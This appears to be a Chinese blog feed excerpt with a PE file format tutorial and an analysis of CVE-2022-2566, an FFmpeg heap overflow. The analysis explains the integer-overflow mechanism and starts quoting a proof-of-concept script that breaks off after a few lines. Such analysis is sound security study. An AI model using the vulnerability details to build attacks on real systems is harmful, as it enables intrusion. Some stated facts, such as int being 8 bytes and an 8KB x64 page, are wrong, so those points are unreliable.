<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a>    DWORD Signature; <span class="co">//该结构体中的Signature就是PE标识符，标识该文件是否是PE文件。该部分占4字节，即“50 45 0000”。</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a>    IMAGE_FILE_HEADER FileHeader;</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span></code></pre></div>
<p>PE头的第一个DWORD是一个标志，大部分文件属性由后面<code>IMAGE_FILE_HEADER</code>和<code>IMAGE_OPTIONAL_HEADER32</code>结构定义。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_FILE_HEADER {</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a>    WORD    Machine;                  <span class="co">// 运行平台</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a>    WORD    NumberOfSections;         <span class="co">// 文件的节数目</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a>    DWORD   TimeDateStamp;            <span class="co">// 文件创建日期和时间</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a>    DWORD   PointerToSymbolTable;     <span class="co">// 指向符号表(用于调试)</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a>    DWORD   NumberOfSymbols;          <span class="co">// 符号表中的符号数量</span></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a>    WORD    SizeOfOptionalHeader;     <span class="co">// IMAGE_OPTIONAL_HANDLER32结构的长度</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a>    WORD    Characteristics;          <span class="co">// 文件的属性 exe=010fh dll=210eh</span></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a>} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span></code></pre></div>
<p><img src="https://pic.imgdb.cn/item/64f4a934661c6c8e541e1f14.jpg" /></p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_OPTIONAL_HEADER {</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a>    WORD    Magic;</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a>    BYTE    MajorLinkerVersion;           <span class="co">// 连接器版本</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a>    BYTE    MinorLinkerVersion;</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a>    DWORD   SizeOfCode;                   <span class="co">// 所有包含代码节的总大小</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>    DWORD   SizeOfInitializedData;        <span class="co">// 所有已初始化数据的节总大小</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a>    DWORD   SizeOfUninitializedData;      <span class="co">// 所有未初始化数据的节总大小</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>    DWORD   AddressOfEntryPoint;          <span class="co">// 程序执行入口RVA(相对虚拟地址)</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a>    DWORD   BaseOfCode;                   <span class="co">// 代码节的起始RVA</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a>    DWORD   BaseOfData;                   <span class="co">// 数据节的起始RVA</span></span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a>    DWORD   ImageBase;                    <span class="co">// 程序镜像基地址</span></span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a>    DWORD   SectionAlignment;             <span class="co">// 内存中节的对其粒度</span></span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a>    DWORD   FileAlignment;                <span class="co">// 文件中节的对其粒度</span></span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a>    WORD    MajorOperatingSystemVersion;  <span class="co">// 操作系统主版本号</span></span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a>    WORD    MinorOperatingSystemVersion;  <span class="co">// 操作系统副版本号</span></span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a>    WORD    MajorImageVersion;            <span class="co">// 可运行于操作系统的最小版本号</span></span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a>    WORD    MinorImageVersion;</span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a>    WORD    MajorSubsystemVersion;        <span class="co">// 可运行于操作系统的最小子版本号</span></span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a>    WORD    MinorSubsystemVersion;</span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a>    DWORD   Win32VersionValue;</span>
<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a>    DWORD   SizeOfImage;                  <span class="co">// 内存中整个PE映像尺寸</span></span>
<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a>    DWORD   SizeOfHeaders;                <span class="co">// 所有头加节表的大小</span></span>
<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a>    DWORD   CheckSum;</span>
<span id="cb4-24"><a href="#cb4-24" aria-hidden="true"></a>    WORD    Subsystem;</span>
<span id="cb4-25"><a href="#cb4-25" aria-hidden="true"></a>    WORD    DllCharacteristics;</span>
<span id="cb4-26"><a href="#cb4-26" aria-hidden="true"></a>    DWORD   SizeOfStackReserve;           <span class="co">// 初始化时堆栈大小</span></span>
<span id="cb4-27"><a href="#cb4-27" aria-hidden="true"></a>    DWORD   SizeOfStackCommit;</span>
<span id="cb4-28"><a href="#cb4-28" aria-hidden="true"></a>    DWORD   SizeOfHeapReserve;</span>
<span id="cb4-29"><a href="#cb4-29" aria-hidden="true"></a>    DWORD   SizeOfHeapCommit;</span>
<span id="cb4-30"><a href="#cb4-30" aria-hidden="true"></a>    DWORD   LoaderFlags;</span>
<span id="cb4-31"><a href="#cb4-31" aria-hidden="true"></a>    DWORD   NumberOfRvaAndSizes;          <span class="co">// 数据目录的结构数量</span></span>
<span id="cb4-32"><a href="#cb4-32" aria-hidden="true"></a>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span>
<span id="cb4-33"><a href="#cb4-33" aria-hidden="true"></a>} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span></code></pre></div>
<p><img src="https://pic.imgdb.cn/item/64f4ac08661c6c8e541e85ef.jpg" /></p>
<p><code>IMAGE_DATA_DIRECTORY</code>数据目录列表，它由16个相同的<code>IAMGE_DATA_DIRECTORT</code>结构组成，</p>
<p>这16个数据目录结构定了简单的指出<code>数据表，输入表，资源表，重定位表</code>等数据的位置和长度：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_DATA_DIRECTORY {</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>    DWORD   VirtualAddress;      <span class="co">// 数据起始RVA</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>    DWORD   Size;                <span class="co">// 数据块的长度</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span></code></pre></div>
<p><img src="https://pic.imgdb.cn/item/64f4ae40661c6c8e541f1bf5.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/64f4aea4661c6c8e541f288c.jpg" /></p>
<p>在数据目录中，并不是所有的目录项都会有值，很多目录项的值都为 0。因为很多目录项的值为0，所以说数据目录项是可选的。</p>
<h3 id="节表">3. 节表</h3>
<p><img src="https://pic.imgdb.cn/item/64f4afd6661c6c8e541f5a2a.jpg" /></p>
<p>在执行PE文件的时候，Windows并不是一开始就将整个文件读入内存，PE装载器在装载的时候仅仅建立好虚拟地址和PE文件的映射关系，具体执行到某个内容页中指令或者访问页中的数据的时候，页面才从磁盘提交到内存中。</p>
<p>Windows装载器在装载DOS部分和PE头和节表（<code>Image_Section_Header</code>）的是不做任何处理，装载节区的时候会根据节的不同做不同的处理。</p>
<ul>
<li><p><strong>节区的属性:</strong> 节是相同属性的数据的组合，当节被装入内存的时候，同一个节对应的内存页面将被赋予相同的页属性，Windows系统对内存属性的设置是以页为单位进行的，所以节在内存中的对其单位必须至少是一个页的大小，对于X86来说这个值是4KB(1000h)，而对于X64来说这个值是8KB(2000h)，磁盘中存储的程序并不会对产4KB，而只有被PE加载器载入内存的时候，PE装载器才会自动的补产4KB对其的零头数据.</p></li>
<li><p><strong>节区的偏移:</strong>节的起始地址在磁盘文件中是按照<code>IMAGEOETIONAI HEADER</code> 结构的<code>FileAhgnment</code>字段<code>(0x200)</code>的值对齐的，而被加载到内存中时是按照同一结构中的<code>SectionAliqnment</code>字段<code>(0x1000)</code>的值对文的，两者的值可能不同，所以一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p></li>
<li><p><strong>节区的尺寸:</strong>由于磁盘映像和内存映像的对齐单位不同，磁盘中的映像在装入内存后会自动的进行长度扩展，而对于<code>末初始化的数据段(.data?)</code>来说，则没有必要为它在磁盘文件中预留空间，只要可执行文件装入内存后动态的为其分配空间即可，所以包含未初始化教据的节在磁盘中长度被定义为0，只有在运行后PE加载器才会动态的为他们开辟空间。</p></li>
<li><p><strong>不进行映射的节:</strong> 有些节中包含的数据仅仅是在装入的时候用到，当文件装载完毕时，他们不会被递交到物理内存中，例如<strong>重定位节</strong>，该节的数据对于文件的执行代码来说是透明的，他只供Windows装载器使用，可执行代码根本不会访问他们，所以这些节存在于磁盘文件中，不会被映射到内存中。</p></li>
</ul>
<p>PE结构所有的节的属性定义都被定义在节表中，节表由一系列的<code>IAMGE_SECTION_HEADER</code>结构体排列而成，每个结构体对应一个节，节表总被放在紧接PE头的地方（PE文件头偏移0xF80）</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_SECTION_HEADER {</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a>    <span class="kw">union</span> {</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>            DWORD   PhysicalAddress;</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>            DWORD   VirtualSize;           <span class="co">// 节区尺寸</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a>    } Misc;</span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a>    DWORD   VirtualAddress;                <span class="co">// 节区RVA</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a>    DWORD   SizeOfRawData;                 <span class="co">// 在文件中对齐后的尺寸</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a>    DWORD   PointerToRawData;              <span class="co">// 在文件中的偏移</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a>    DWORD   PointerToRelocations;          <span class="co">// 在OBJ文件中使用,重定位的偏移</span></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>    DWORD   PointerToLinenumbers;          <span class="co">// 行号表的偏移</span></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>    WORD    NumberOfRelocations;</span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>    WORD    NumberOfLinenumbers;</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a>    DWORD   Characteristics;               <span class="co">// 节区属性字段,可读，可写，可执行等</span></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a>} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span></code></pre></div>
<p><img src="https://pic.imgdb.cn/item/64f4b509661c6c8e54206281.jpg" /></p>
<ul>
<li><p>全部有效结构<code>最后以一个空的IMAGE_SECTION_HEADER结构作为结束</code>，所以节表中<code>总的IMAGE_SECTION_HEADER结构数量等于节的数量加一</code>。</p></li>
<li><p>另外，节表中 IMAGE_SECTION_HEADER 结构的总数总是由PE文件头 <code>IMAGE_NT_HEADERS-&gt;FileHeader.NumberOfSections</code>字段来指定的。（因为节表的个数是节的个数+1）</p></li>
</ul>
<h3 id="区块节section">4. 区块（节/Section）</h3>
<p><img src="https://pic.imgdb.cn/item/64f4b876661c6c8e5420dc7f.jpg" /></p>
<p>由于一些PE文件为减少体积，磁盘对齐值不是一个内存页 <code>1000h</code>，而是 <code>200h</code>，当这类文件被映射到内存后，同一数据相对于文件头的偏移量在内存中和磁盘文件中是不同的，这样就存在着<code>文件偏移地址与虚拟地址的转换</code>问题。</p>
<p><img src="https://pic.imgdb.cn/item/64f4b8c3661c6c8e5420e591.jpg" /></p>
<p>从这张图可以看到：</p>
<ul>
<li>DOS头部的起始地址（基地址）变成了<strong>00400000h</strong></li>
<li>块表与.text块之间用<strong>0</strong>填充了，因为.text块的起始地址变成了<strong>00401000h</strong></li>
<li>.text块.rdata块、.data块三者之间用<strong>0</strong>填充了，因为要保证每一块的大小都是<strong>1000h</strong></li>
</ul>
<h4 id="代码节-.text">4.1 代码节 .text</h4>
<p>该节含有程序的<code>可执行代码</code>,每个PE文件都有代码节.</p>
<p><img src="https://pic.imgdb.cn/item/64f4b928661c6c8e5420f0d0.jpg" /></p>
<h4 id="已初始化的数据节-.data">4.2 已初始化的数据节 .data</h4>
<p>已初始化的数据节中放的是在编译时刻就已确定的数据。</p>
<h4 id="未初始化的数据节-.bbs">4.3 未初始化的数据节 .bbs</h4>
<p>这个节里放有未初始化的全局变量和静态变量。</p>
<ul>
<li>例如“static int k;”</li>
</ul>
<h4 id="引入函数节-.rdata">4.4 引入函数节 .rdata</h4>
<p><strong>PE文件的引入函数机制-导入表（import）</strong></p>
<p>导入函数就是程序调用其执行代码并不在程序中的函数，通常是系统API，在调用者程序中只保留一些函数信息，包括函数名机器所在的DLL路径。</p>
<p>对于磁盘上的PE文件来说，它无法得知这些导入函数会在的那个内存的那个地方出现，只有当PE文件被装入内存时，Windows装载器才将DLL载入，并调用导入函数指令，和函数实际所处的地址联系起来。</p>
<p>也就是说，当PE文件被装载的时候，Windows装载器会根据rdata段内xxxx处的RVA得到函数名，再根据函数名在内存中找到函数地址并且用函数地址将rdata段内xxxx处的内容替换成真正的函数地址。</p>
<p>导入表位置和大小可以从PE文件头中<code>IMAGE_OPTIONAL_HEADER32</code>结构的 <code>IMAGE_DATA_DIRECTORY</code>数据目录字段中获取，从 <code>IMAGE_DATA_DIRECTORY</code>字段得到的是导入表的RVA值，如果在内存中查找导入表，那么将RVA值加上PE文件装入的基址就是实际的地址。</p>
<p><img src="https://pic.imgdb.cn/item/64f4bca5661c6c8e542162cc.jpg" /></p>
<p>找到了数据目录结构，既能够找到导入表，导入表由一系列的 <code>IMAGE_IMPORT_DESCRIPTOR</code>结构组成，结构的数量取决于程序需要使用的<code>DLL</code>文件数量，每个结构对应一个<code>DLL</code>文件，在所有结构的最后，由一个内容全为0的<code>IMAGE_IMPORT_DESCRIPTOR</code>结构作为结束标志，表结构定义如下:</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_IMPORT_DESCRIPTOR {</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a>    <span class="kw">union</span> {</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a>        DWORD   Characteristics;</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a>        DWORD   OriginalFirstThunk;     <span class="co">// 包含指向IMAGE_THUNK_DATA(输入名称表)结构的数组</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a>    } DUMMYUNIONNAME;</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a>    DWORD   TimeDateStamp;              <span class="co">// 当可执行文件不与被输入的DLL进行绑定时，此字段为0 </span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a>    DWORD   ForwarderChain;             <span class="co">// 第一个被转向的API的索引</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a>    DWORD   Name;                       <span class="co">// 指向被输入的DLL的ASCII字符串的RVA</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a>    DWORD   FirstThunk;                 <span class="co">// 指向输入地址表(IAT)的RVA</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a>} IMAGE_IMPORT_DESCRIPTOR;</span></code></pre></div>
<p><img src="https://pic.imgdb.cn/item/64f4be30661c6c8e5421ea49.jpg" /></p>
<p><code>OriginalFirstThunk</code>和<code>FirstThunk</code> 字段是相同的，他们都指向一个包含 <code>IMAGE_THUNK_DATA</code>结构的数组，数组中每个<code>IMAGE_THUNK_DATA</code> 结构定义了一个导入函数的具体信息，数组的最后以一个内容全为0的<code>IMAGE_THUNK_DATA</code> 结构作为结束，该结构的定义如下:</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_THUNK_DATA32 {</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a>    <span class="kw">union</span> {</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a>        DWORD ForwarderString;      <span class="co">// PBYTE </span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true"></a>        DWORD Function;             <span class="co">// PDWORD</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true"></a>        DWORD Ordinal;</span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true"></a>        DWORD AddressOfData;        <span class="co">// PIMAGE_IMPORT_BY_NAME</span></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true"></a>    } u1;</span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true"></a>} IMAGE_THUNK_DATA32;</span></code></pre></div>
<p>从上方的结构定义不难看出，这是一个双字共用体结构，当结构的最高位为1时，表示函数是以序号的方式导入的，这时双字的低位就是函数的序号，当双字最高位为0时，表示函数以函数名方式导入，这时双字的值是一个RVA，指向一个用来定义导入函数名称的 <code>IMAGE_IMPORE_BY_NAME</code> 结构，此结构定义如下</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_IMPORT_BY_NAME {</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>    WORD    Hint;          <span class="co">// 函数序号</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>    CHAR   Name[<span class="dv">1</span>];        <span class="co">// 导入函数的名称</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a>} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span></code></pre></div>
<p><img src="https://pic.imgdb.cn/item/64f4c1ce661c6c8e54223b3d.jpg" /></p>
<p>总结起来：</p>
<p><img src="https://pic.imgdb.cn/item/64f4c1f9661c6c8e54223f16.jpg" /></p>
<p>当PE被载入内存之后，内存中的映像会被修正为：</p>
<p><img src="https://pic.imgdb.cn/item/64f4c3ea661c6c8e542284a1.jpg" /></p>
<p>其中由 <code>FristThunk</code> 字段指向的那个数组中的每个双字都被替换成了真正的函数入口地址，之所以在PE文件中使用两份<code>IMAGE_THUNK_DATA</code>数组的拷贝并修改其中的一份，是为了最后还可以留下一份备份数据用来反过来查询地址所对应的导入函数名。</p>
<h4 id="引出函数节-.edata并入.text">4.5 引出函数节 .edata(并入.text)</h4>
<p><strong>DLL文件的函数引出机制</strong></p>
<p>当PE文件执行时 Windows装载器将文件装入内存并将导入表中登记的DLL文件一并装入，再根据DLL文件中函数的导出信息对可执行文件的导入表(IAT)进行修正.</p>
<p>导出函数的DLL文件中，导出信息被保存在导出表，导出表就是记载着动态链接库的一些导出信息。通过导出表，DLL文件可以向系统提供导出函数的名称、序号和入口地址等信息，以便Windows装载器能够通过这些信息来完成动态链接的整个过程</p>
<p>导出函教存储在PE文件的导出表里，导出表的位置存放在PE文件头中的数据目录表中，与导出表对应的项目是数据目录中的首个 <code>IMAGE_DATA_DIRECTORY</code>结构，从这个结构的 <code>VirtualAddress</code>字段得到的就是导出表的RVA值,导出表同样可以使用函数名或序号这两种方法导出函数.</p>
<p><img src="https://pic.imgdb.cn/item/64f4c84e661c6c8e5422e72f.jpg" /></p>
<p>导出表的起始位置有一个<code>IMAGE_EXPORT_DIRECTORY</code>结构与导入表中有多个<code>IMAGE_IMPORT_DESCRIPTOR</code>结构不同，导出表只有一个<code>IMAGE_EXPORT_DIRECTORY</code>结构，该结构定义如下:</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _IMAGE_EXPORT_DIRECTORY {</span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a>    DWORD   Characteristics;</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>    DWORD   TimeDateStamp;        <span class="co">// 文件的产生时刻</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>    WORD    MajorVersion;</span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>    WORD    MinorVersion;</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>    DWORD   Name;                  <span class="co">// 指向文件名的RVA</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a>    DWORD   Base;                  <span class="co">// 导出函数的起始序号</span></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a>    DWORD   NumberOfFunctions;     <span class="co">// 导出函数总数</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a>    DWORD   NumberOfNames;         <span class="co">// 以名称导出函数的总数</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a>    DWORD   AddressOfFunctions;    <span class="co">// 导出函数地址表的RVA</span></span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a>    DWORD   AddressOfNames;        <span class="co">// 函数名称地址表的RVA</span></span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a>    DWORD   AddressOfNameOrdinals; <span class="co">// 函数名序号表的RVA</span></span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true"></a>} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span></code></pre></div>
<p>Base一般为1，函数的序号等于Base+引出序号表里的值</p>
<p><img src="https://pic.imgdb.cn/item/64f4c8d3661c6c8e5422f4d5.jpg" /></p>
<p>在上图中最左侧 <code>AddressOfNames</code>结构成员指向了一个数组，数组里保存着一组RVA，每个RVA指向一个字符串即导出的函数名，与这个函数名对应的是 <code>AddressOfNameOrdinal</code>中的结构成员，该对应项存诸的下是函数的唯一编号并与<code>AddressOfFunctions</code>结构成员相关联，形成了一个导出链式结构体。</p>
<h4 id="资源节-.rsrc">4.5 资源节 .rsrc</h4>
<p>这个节放有如图标、对话框等程序要用到的资源</p>
<h4 id="重定位节-.reloc">4.6 重定位节 .reloc</h4>
<p>用于镜像地址改变后的地址自动修正</p>
<p>重定位节存放了一个重定位表，若装载器不是把程序装到程序编译时默认的基地址时，就需要这个重定位表来做一些调整</p>]]></description>
    <pubDate>Mon, 4 Sep 2023 15:29:23 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[CVE-2022-2566 分析和复现]]></title>
    <link>https://blog.mark0519.com/#/221020-CVE_2022_2566</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/221020-CVE_2022_2566</guid>
    <description><![CDATA[<h1 id="cve-2022-2566-分析和复现">CVE-2022-2566 分析和复现</h1>
<blockquote>
<p>FFmpeg v5.1 堆越界内存写入(.djvu文件)</p>
</blockquote>
<h2 id="x00-背景">0x00 背景</h2>
<p><code>FFmpeg</code> https://www.ffmpeg.org/</p>
<p>它视频处理最常用的开源软件。它功能强大，用途广泛，大量用于视频网站和商业软件（比如 Youtube 和 iTunes），也是许多音频和视频格式的标准编码/解码实现。</p>
<p>在 <code>libavformat/mov.c</code>中发现了影响 FFmpeg 自 5.1 版或提交 ab77b878f1205225c6de1370fb0e998dbcc8bc69 的堆越界写入。</p>
<p>Google的分析：<a href="https://github.com/google/security-research/security/advisories/GHSA-vhxg-9wfx-7fcj">FFmpeg: Heap Out-Of-Bounds Write in build_open_gop_key_points · Advisory · google/security-research (github.com)</a></p>
<p>该漏洞被定位是高危漏洞（<em>High</em>），攻击者可以通过恶意 mp4 文件导致远程代码执行（RCE）。</p>
<h2 id="x01-漏洞分析">0x01 漏洞分析</h2>
<p>根据CVE描述，可以知道漏洞在 ab77b878f1205225c6de1370fb0e998dbcc8bc69 提交中引入。</p>
<p>而对应的修复commit为：6f53f0d09ea4c9c7f7354f018a87ef840315207d。</p>
<p>对应的修复：</p>
<p><a href="https://github.com/FFmpeg/FFmpeg/commit/6f53f0d09ea4c9c7f7354f018a87ef840315207d">avformat/mov: Check count sums in build_open_gop_key_points() · FFmpeg/FFmpeg@6f53f0d (github.com)</a></p>
<figure>
<img src="https://pic1.imgdb.cn/item/634fc0f416f2c2beb16005d9.png" alt="" /><figcaption>fix</figcaption>
</figure>
<p>可以看到关键代码为：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>        sc-&gt;sample_offsets_count += sc-&gt;ctts_data[i].count;</span></code></pre></div>
<p>而变量<code>sc-&gt;sample_offsets_count</code>被定义为<code>int</code></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="dt">int</span> sample_offsets_count;</span></code></pre></div>
<p>所以<code>sc-&gt;sample_offsets_count</code>为8字节数，如果最大值超过<code>INT_MAX</code>则会发生整数溢出。</p>
<p>这个整数溢出会影响接下来malloc的申请：</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a>sc-&gt;sample_offsets = av_calloc(sc-&gt;sample_offsets_count, <span class="kw">sizeof</span>(*sc-&gt;sample_offsets));</span></code></pre></div>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="dt">void</span> *av_calloc(<span class="dt">size_t</span> nmemb, <span class="dt">size_t</span> size) av_malloc_attrib av_alloc_size(<span class="dv">1</span>, <span class="dv">2</span>);</span></code></pre></div>
<p><img src="https://pic1.imgdb.cn/item/634ff67a16f2c2beb1bd971d.png" /></p>
<p>如果出现整数溢出导致<code>sc-&gt;sample_offsets_count == 0</code>就会导致<code>av_calloc</code>申请最小的chunk</p>
<p>也就是<code>sc-&gt;sample_offsets</code>会指向一个0x20的chunk</p>
<p>之后会把每个ctts的duration写入这个chunk中：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a>    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</span></code></pre></div>
<p>如果<code>sc-&gt;ctts_data[i].duration</code>过长，就会产生堆溢出。</p>
<h2 id="x02-poc调试">0x02 POC调试</h2>
<p>这里给出Google安全研究员提供的POC</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="co">#!/usr/bin/env python3</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="im">import</span> struct</span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="im">import</span> sys</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>HEVC_NAL_CRA_NUT <span class="op">=</span> <span class="dv">21</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a></span>
